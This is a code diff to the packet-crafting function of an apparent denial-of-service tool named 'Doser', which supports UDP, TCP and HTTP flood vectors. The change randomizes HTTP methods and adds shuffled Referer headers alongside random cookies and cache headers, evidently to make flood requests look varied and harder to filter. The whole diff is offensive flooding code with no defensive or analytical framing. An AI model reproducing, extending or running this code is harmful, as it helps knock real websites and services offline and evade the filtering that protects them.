@@ -267,12 +267,14 @@ std::string Doser::craft_packet(bool keep_alive){
     shuffle(std::begin(caching), std::end(caching), std::mt19937(std::random_device()()));
     shuffle(std::begin(charset), std::end(charset), std::mt19937(std::random_device()()));
     shuffle(std::begin(contenttype), std::end(contenttype), std::mt19937(std::random_device()()));
+    shuffle(std::begin(methods), std::end(methods), std::mt19937(std::random_device()()));
+    shuffle(std::begin(referer), std::end(referer), std::mt19937(std::random_device()()));
     switch(conf->vector){
         case config::UDPFlood:
         case config::TCPFlood:
             return createStr();
         case config::HTTP:{
-           packet += "GET /";
+           packet += methods[0] + " /";
             if(conf->RandomizeHeader){
                 packet += createStr();
             }
@@ -285,6 +287,7 @@ std::string Doser::craft_packet(bool keep_alive){
             packet += " \r\nCache-Control: " + caching[0]
                       + " \r\nAccept-Encoding: " + encoding[0]
                       + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
+                      + " \r\nReferer: " + referer[0]
                       + " \r\nAccept: */*\r\nConnection: Keep-Alive"
                       + " \r\nContent-Type: " + contenttype[0]
                       + " \r\nCookie: " + createStr() + "=" + createStr()
@@ -298,7 +301,7 @@ std::string Doser::craft_packet(bool keep_alive){
                           + std::to_string(randomInt(1, 5000))
                           + " \r\n";
             }else{
-                packet += "GET /";
+                packet += methods[0] + " /";
                 if(conf->RandomizeHeader){
                     packet += createStr();
                 }
@@ -311,10 +314,12 @@ std::string Doser::craft_packet(bool keep_alive){
                 packet += " \r\nCache-Control: " + caching[0]
                           + " \r\nAccept-Encoding: " + encoding[0]
                           + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
+                          + " \r\nReferer: " + referer[0]
                           + " \r\nContent-Type: " + contenttype[0]
                           + " \r\nCookie: " + createStr() + "=" + createStr()
-                          + " \r\nAccept: */*\r\n"
-                          + "X-a: " + std::to_string(randomInt(1, 5000)) + " \r\n";
+                          + " \r\nAccept: */*"
+                          + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
+                          + " \r\n";
             }
             return packet;
         }
